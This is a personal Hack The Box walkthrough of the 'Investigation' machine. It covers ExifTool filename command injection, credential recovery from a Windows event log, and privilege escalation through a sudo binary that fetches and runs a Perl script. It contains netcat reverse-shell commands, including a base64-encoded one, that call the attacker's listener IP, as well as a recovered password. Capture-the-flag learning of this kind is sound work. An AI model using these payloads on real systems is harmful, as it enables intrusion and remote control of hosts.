@@ -1,0 +1,183 @@
+INVESTIGATION (medium)		HTB		10.10.11.197
+
+There are no easy machine that I can commit on HTB this week so I have to upgrade myself and make for the first time after a while
+a medium difficult machine let's see what it give to us
+
+
+===PORTS=SCANNING================================================
+ ---
+|TCP|
+ ---
+22	ssh
+80	http (Apache 2.4.41) that redirect to http://eforenzics.htb/ (added to /etc/hosts)
+==================================================================
+
+
+
+[nothin' with the directory busting]
+
+
+===INITIAL=FOOTHOLD=============================================================================================================================================
+On http we are served with a webapp of a eForezinc company all the site is static unless the section Free Services (/service.html) that
+enable the user to upload a img (JPG only) obviously here is the door we will use to get into the webserver.
+
+With a cute anime cat-girl JPG as a prototype I uploaded the image and see what was going on behind the scenes
+	1] Image upload
+	2] The website give you a link were you can see the analysis of the uploaded images
+	3] The link redirect to /analysed_images/[JPG_IMAGE_NAME].txt and show us a ExifTool output (cool I have used ExifTool on HTB/Precious)
+
+So the first idea I came out with is that the webserve will do a command like " exiftool example.jpg " so If im able to add a | or ;
+in the upload action on the jpg name maybe the server will do the action we want to add after | or ; (also exiftool version is 12.37), or 
+something similar should be the vulnerability here
+
+And exactly as I said (I swear I haven't watched anything before writing this line of text lol) exiftool < 12.38 is vulnerable to command
+injection : if the filename end with "|" character (and obv exists on the filesystem) will be treated as command and executed by the server
+and Command Injection will occur.
+
+I can try with a simple nc command that connect to the attacker listener just as proof that the command will be executed as we want
+and we are good now no verification is made to check if the file is a jpg so we can upload letteraly whatever we want.
+
+The main problem here was that the "/" character that I need in my rev shell (nc 10.10.14.111 50032 -e /bin/bash) is escaped by the machine,
+my intuition here was to use multiple pipe for make a reverse shell without the "/" directly.
+
+So I use something like (the string in echo is the reverse shell in base64 encoding):
+
+	echo "bmMgMTAuMTAuMTQuMTExIDUwMDMyIC1lIC9iaW4vYmFzaAo=" | base64 --decode | sh |
+
+but somehow didn't worked I've tried replacing sh with bash but still nothing, and was strange for me cuz encoding just nc 10.10.14.111
+50032 was working.
+
+So after beating my up against the wall for like the 2312321 time I decide to se the walkthrough and my surprise the intuition was right 
+but the "payload" that work was using a /dev/tcp shell with bash and not sh.
+
+Actually I don't understand why that worked and mine not but happy to see that I was able to figure out the problem of the character escape on "/"
+and we got a shell.
+
+[I've trying for a lot of time to figure out why the nc injected command with -e /bin/bash wasn't working and I came out with nothing
+but the lesson here is that I rely too much on other system to have netcat installed but IRL what machine if the ones with specific purpose
+have netcat installed? no one so use the "daefault" reverse shell with /dev/tcp is always a good idea staying with the idea that in IRL
+scenario first we don't know if they have a particular tool installed and second....come on who have nc installed as default? lol]
+
+
+
+Actually this part was not that difficult for a medium machine so I think the hard part will be on PE.
+
+
+
+
+===PE[1]======================================================================================
+As first shell we are logged in the victim machine with www-data so not even the user lvl.
+www-data had a cronjob removing all the uploads and the analysis of the uploaded image (the output of exiftool)
+
+inside /usr/local/investigation there is a .msg file called 'Windows Event Log for Analysis.msg', the MSG file is a item saved
+within Microsoft Outlook so can be a attachments of a email, message,appointment or task.
+
+When cat the file is not human readable so I will save it on my machine and find a method to read it.
+
+I've installed MSGviewer (https://github.com/lolo101/MsgViewer) on attacker machine and the result is an email (email.png) adn the content
+Is a email from Thmas Jones to Steve Morton (morton is a user on the victim machine), the content can be seen in the png.
+ 
+With this email there is .evtx file as attachment, a extension for window's events viewer and using evtx_dump.py (https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py) for a human readable format, in this case
+XML, and here the hard part....is a log file with more than 300K LOL.....but that's ok I need to study how to analyze log files
+(a good starting point for log files size is from 5 to 10 times the volume of original data so almost every time you need a method
+for analyze log files without check manually every row...pretty boringh ah?)
+
+
+
+
+
+===LOG=FILES=ANALYSIS===========================================================================
+This is the first time I pratically put my hands on log files so I need to develop some standard skill for every type of log file,
+look for some tool (I have no idea if some sort of tool exist and if yes how usefull can be) but mainly I need to know what I'm
+reading when I encounter log files.
+
+
+Starts from the basic WHAT IS A WINDOWS EVENT LOG?
+Is a log that record security significant events....no need to tell why is important for a pentester right? btw this type of log
+is more complex than the Unix syslog so we need to know a few tricks.
+
+[1] Windows log doesn't save the full event message instead a EVENT PROVIDER use it for register a DLL that contains the full message.
+[2] The EventID is the index of the message table (reused by different provider)
+[3] the combo PROVIDER+EVENT_ID is the identifier of the messages (same id but different provider = different message)
+
+The real problem here is exported log file doesn't have the DLL presence on the attacker machine so we can't recreate the Event Message,
+there are some solutions like https://www.ultimatewindowssecurity.com but is not really pratical checking for every ID so we will miss some
+important info....but not ALL the info, we will not know what event mesage is but we can check for the data saved by the log manager.
+
+Here I came out with a solution that is not a state-of-art type lol but first I will say few words about the machine itself.
+I watched a pair of walkthrough to understand how to solve this part of the box and I haven't retrieve no usefull info or methods....
+Obviously I know the solutionon this log analysis but it's not my type of workflow to just take the solutions whitout all the actions needed for obtain the solutiuon.
+
+In the EVENT DATA field I've notice the package MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 that include all the procedures and rules for a secure login process
+grep that we have 16 records and analyzing 1 by 1 (using some cool trick learned from Occupy The Web book!) I found the credentials.
+
+NOTE : with some google search I came out that process_ID 628 definition is a password reset (https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=628)
+and cool this can be usefull for us, but when grep that there are a lot of records but usefull exercise to understand what the specific event where
+we found the credentials for smorton.
+
+ProcessID 628 = password reset
+ThreadID 4608 = OS booting
+
+So we can tell (not 100% sure) the log manager saved the event at the startup of the OS of a password reset with a "Def@ultf0r3nz!csPa$$" password.
+
+[before going through the part 2 of PE a few words on this first sight of log file, really caothic at the and the mole of records is really
+high mking harder and frastruating to find specific value expecially if you don't know exactly what you need, after this machine I'm gonna make
+some research and study how to improve this skill that can be a good investment...I read online that log files DON'T LIE and are the only truth ground
+and this for an attacker can be a win situation so always a good thing to know the foundamental about this field]
+
+
+===PE[2]=========================================================================================================================================================
+The credential found on the log file worked with smorton user on ssh and we got the user flag, now the last step obtain root privileges.
+
+
+sudo -l output
+-------------------------------------
+    (root) NOPASSWD: /usr/bin/binary
+-------------------------------------
+
+Ok cool the first I do when trying to make PE is sudo -l and check the output this time I was lucky and the solution can be here.
+Never met /usr/bin/binary until now so first of all I'm going to try with sudo and look at the output which is "Exiting...".
+
+Interesting and challenging at the same time that no -h flag and I've not found nothing on google so I decide to look up at the /usr/src directory
+and find the binary directory and inside there is only a file called "printf.h" as I know the '.h' extension is a header file that contain function
+declaration and the printf.h contains....the printf function but idk if this can help me and before going in a possible rabbit hole I need to make
+a step back and think.
+
+
+
+===REVERSE=ENGINEERING=========================================================================================================================
+maybe will be a good idea to use a decompiler so we can see the source code [saved on source.cpp] and reverse engineering the code.
+I will write down the critical points :
+
+	1] the function need 2 arguments (argc != 3)
+	2] the last argument need to be "lDnxUysaQn"
+	3] The "lDnxUysaQn" have to be a file and a file puntator will be assigne to his address
+	4] the var_40 integer variable saved the value 0x2712 = 10002 in hex / 
+	5] rax_9 variable save the output of curl_easy_init returns a easy CURL handler
+	6] curl_setopt is called and is used for configure he eay handler called before and the call is curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
+	   so the handler that's configured is the [5] the second argument is the file to obtain (network addres like a normal curl in bash)
+	7] with curl_easy_perform(rax_9) make the curl transfer on the [5] handler (exit if error)
+	8] read the content obtained with curl and execute with perl (with root privilege), the content of the file is saved on [2]
+	9] after the execution delete [1] and exit
+
+Ok, cool I think I understood the code butn ot in detail but this will be something I'm going to check in the future (maybe some uni teacher
+can help me to understand all the main body but for now we know the essence of this code).
+
+So first of all let's try with the parameters needed and now the message is "Running..." ok we understood right the code now
+on my local machine I run a python http.server for the CURL transfer that take the reverse shell in per execute and connect to my listener
+and boom we got a reverse root shell!
+
+
+
+===CONCLUSION=================================
+I appreciate the boxes overall the last part (reverse engineering) was new to me and relly fun when I discovered that I figured out by myself
+using some walkthrough just to know if my solution was the right one.
+Really confused on the log analysis but I will deep that argument soon or later because as I said is a foundamental skill for a pentester but
+almost for every role in computer and network security, so now I'm confused but my iobjective is to improve this part even if seems boring to me...
+
+Cool machine and even if in medium I expected something out of my line of sigt but this machine was just more complex but I live with the philosophy
+"Harder is not impossible", I will try more medium machine so with the time pass by I can improve my skill.
+
+
+
+
